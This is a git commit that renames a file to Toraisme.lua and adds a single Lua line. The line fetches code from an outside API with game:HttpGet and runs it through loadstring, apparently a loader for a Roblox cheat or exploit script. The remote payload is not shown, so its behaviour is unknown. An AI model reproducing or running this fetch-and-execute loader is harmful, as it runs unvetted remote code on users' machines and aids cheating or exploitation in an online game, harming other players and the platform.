cfe50d8e86624ea8547190ebaa022b02d8e9a89e
R0bI0x9 <sotingcd11@gmail.com>
2026-06-15 20:57:51 +0800

    Update and rename lua", to Toraisme.lua

---
+++ Toraisme.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjhhYTQ4YTI4LTZmYTEtNGQ2NC05ZjFlLTUyYzI4NDBjNDE0YSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
